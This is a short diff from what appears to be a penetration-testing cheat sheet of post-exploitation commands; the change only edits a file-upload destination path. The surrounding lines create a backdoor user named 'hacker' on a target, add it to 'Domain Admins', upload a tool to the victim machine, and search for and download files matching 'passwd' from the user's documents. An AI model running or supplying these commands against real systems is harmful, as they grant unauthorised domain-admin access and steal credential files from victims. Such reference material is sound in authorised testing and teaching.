@@ -382,7 +382,7 @@ add_user hacker password -h <target IP>
 add_group_user "Domain Admins" hacker -h <target IP>
 
 upload <local path> <remote path>
-upload /root/putty.exe C:\\Documents\ and\ Settings\\Administrator\Desktop\
+upload /root/putty.exe c:\\
 
 # Find and download files
 run search_dwld "%USERPROFILE%\\my documents" passwd
